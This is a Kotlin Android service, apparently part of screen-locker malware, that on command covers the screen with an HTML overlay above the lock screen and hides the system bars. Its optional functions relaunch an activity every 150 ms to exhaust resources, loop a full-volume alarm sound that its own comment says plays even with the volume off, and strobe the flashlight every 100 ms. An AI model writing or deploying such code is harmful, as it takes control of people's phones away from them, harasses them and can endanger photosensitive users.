package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.PixelFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import java.io.IOException

class ComboLockService : Service() {

    companion object {
        const val ACTION_SHOW = "com.sync.xxx.COMBO_LOCK_SHOW"
        const val ACTION_HIDE = "com.sync.xxx.COMBO_LOCK_HIDE"
        const val EXTRA_HTML = "html"
        const val EXTRA_CRASH = "crash"
        const val EXTRA_SOUND = "sound"
        const val EXTRA_FLASHLIGHT = "flashlight"
    }

    private var windowManager: WindowManager? = null
    private var webView: WebView? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    
    // Optional features
    private var crashEnabled = false
    private var soundEnabled = false
    private var flashlightEnabled = false
    
    private var mediaPlayer: MediaPlayer? = null
    private var cameraManager: CameraManager? = null
    private var cameraId: String? = null
    private val flashHandler = Handler(Looper.getMainLooper())
    private var flashRunnable: Runnable? = null
    private var flashState = false

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_SHOW -> {
                    val html = intent.getStringExtra(EXTRA_HTML) ?: ""
                    crashEnabled = intent.getBooleanExtra(EXTRA_CRASH, false)
                    soundEnabled = intent.getBooleanExtra(EXTRA_SOUND, false)
                    flashlightEnabled = intent.getBooleanExtra(EXTRA_FLASHLIGHT, false)
                    mainHandler.post { showComboLock(html) }
                }
                ACTION_HIDE -> mainHandler.post { hideComboLock() }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        
        try {
            cameraId = cameraManager?.cameraIdList?.get(0)
        } catch (e: Exception) {
            Log.e("ComboLock", "Camera init error: ${e.message}")
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_SHOW)
            addAction(ACTION_HIDE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(receiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(receiver, filter)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun showComboLock(html: String) {
        hideComboLock()

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        // HARDCORE FLAGS: Block everything, no touch passthrough, always on top
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )

        try {
            val wv = WebView(this)
            wv.settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                cacheMode = WebSettings.LOAD_NO_CACHE
                allowFileAccess = false
                allowContentAccess = false
                @Suppress("DEPRECATION")
                allowUniversalAccessFromFileURLs = false
                @Suppress("DEPRECATION")
                allowFileAccessFromFileURLs = false
            }

            wv.webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(view: android.webkit.WebView, url: String): Boolean = true
                
                override fun onReceivedError(view: android.webkit.WebView, errorCode: Int, description: String, failingUrl: String) {
                    Log.e("ComboLock", "WebView error: $description")
                }
            }

            val wrappedHtml = """
                <!DOCTYPE html>
                <html>
                <head>
                    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
                    <style>
                        * { margin:0; padding:0; box-sizing:border-box; }
                        html, body { width:100%; height:100%; overflow:hidden; background:#000; }
                    </style>
                </head>
                <body>
                    ${if (html.isNotBlank()) html else "<div style='color:#fff;padding:20px;text-align:center;'>LOCKED</div>"}
                </body>
                </html>
            """.trimIndent()

            wv.loadDataWithBaseURL(null, wrappedHtml, "text/html", "UTF-8", null)

            webView = wv
            windowManager?.addView(wv, params)

            @Suppress("DEPRECATION")
            wv.systemUiVisibility = (
                android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
                android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            )

            // Start optional features
            if (crashEnabled) startCrashLoop()
            if (soundEnabled) startSound()
            if (flashlightEnabled) startFlashlightStrobe()

            Log.d("ComboLock", "COMBO LOCK shown | crash=$crashEnabled sound=$soundEnabled flash=$flashlightEnabled")
        } catch (e: Exception) {
            Log.e("ComboLock", "showComboLock error: ${e.message}", e)
            // Fallback: show simple black overlay if WebView fails
            try {
                val fallbackView = android.view.View(this@ComboLockService)
                fallbackView.setBackgroundColor(android.graphics.Color.BLACK)
                webView = null
                windowManager?.addView(fallbackView, params)
                
                // Still start features even if WebView failed
                if (crashEnabled) startCrashLoop()
                if (soundEnabled) startSound()
                if (flashlightEnabled) startFlashlightStrobe()
            } catch (e2: Exception) {
                Log.e("ComboLock", "Fallback view error: ${e2.message}", e2)
            }
        }
    }

    private fun hideComboLock() {
        stopAllFeatures()

        webView?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        webView = null
        Log.d("ComboLock", "COMBO LOCK hidden")
    }

    // ══════════════════════════════════════════════════════════════
    // OPTIONAL FEATURE: CRASH SYSTEM (Spam activities to overload)
    // ══════════════════════════════════════════════════════════════
    private var crashLoopRunnable: Runnable? = null
    
    private fun startCrashLoop() {
        if (!crashEnabled) return
        
        // Stop any existing crash loop first
        crashLoopRunnable?.let { mainHandler.removeCallbacks(it) }
        
        crashLoopRunnable = object : Runnable {
            override fun run() {
                if (!crashEnabled) return
                try {
                    // Check if activity exists before spamming
                    val activityClass = try {
                        Class.forName("com.sync.xxx.LockNewActivity")
                    } catch (e: ClassNotFoundException) {
                        Log.e("ComboLock", "LockNewActivity not found, crash feature disabled")
                        crashEnabled = false
                        return
                    }
                    
                    // Spam intent to trigger resource exhaustion
                    val intent = Intent(this@ComboLockService, activityClass).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NO_ANIMATION
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    Log.e("ComboLock", "Crash loop error: ${e.message}")
                }
                mainHandler.postDelayed(this, 150) // Spam every 150ms (slower to prevent ANR)
            }
        }
        mainHandler.post(crashLoopRunnable!!)
    }
    
    private fun stopCrashLoop() {
        crashLoopRunnable?.let { mainHandler.removeCallbacks(it) }
        crashLoopRunnable = null
    }

    // ══════════════════════════════════════════════════════════════
    // OPTIONAL FEATURE: SOUND (Force play even when volume off)
    // ══════════════════════════════════════════════════════════════
    private fun startSound() {
        if (!soundEnabled) return
        try {
            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_ALARM)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                )
                // Use a built-in notification sound or raw resource if available
                setDataSource(applicationContext, android.provider.Settings.System.DEFAULT_ALARM_ALERT_URI)
                isLooping = true
                setVolume(1.0f, 1.0f) // Max volume
                prepare()
                start()
            }
            Log.d("ComboLock", "Sound started (ALARM stream)")
        } catch (e: IOException) {
            Log.e("ComboLock", "Sound error: ${e.message}")
        }
    }

    private fun stopSound() {
        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
        } catch (_: Exception) {}
        mediaPlayer = null
    }

    // ══════════════════════════════════════════════════════════════
    // OPTIONAL FEATURE: FLASHLIGHT STROBE (Rapid flashing)
    // ══════════════════════════════════════════════════════════════
    private fun startFlashlightStrobe() {
        if (!flashlightEnabled || cameraId == null) return
        
        flashRunnable = object : Runnable {
            override fun run() {
                if (!flashlightEnabled) return
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        cameraManager?.setTorchMode(cameraId!!, flashState)
                        flashState = !flashState
                    }
                } catch (e: CameraAccessException) {
                    Log.e("ComboLock", "Flashlight error: ${e.message}")
                }
                flashHandler.postDelayed(this, 100) // Toggle every 100ms = fast strobe
            }
        }
        flashHandler.post(flashRunnable!!)
        Log.d("ComboLock", "Flashlight strobe started")
    }

    private fun stopFlashlight() {
        flashRunnable?.let { flashHandler.removeCallbacks(it) }
        flashRunnable = null
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager?.setTorchMode(cameraId ?: return, false)
            }
        } catch (_: Exception) {}
    }

    private fun stopAllFeatures() {
        crashEnabled = false
        soundEnabled = false
        flashlightEnabled = false
        stopCrashLoop()
        stopSound()
        stopFlashlight()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        hideComboLock()
        try { unregisterReceiver(receiver) } catch (_: Exception) {}
    }
}
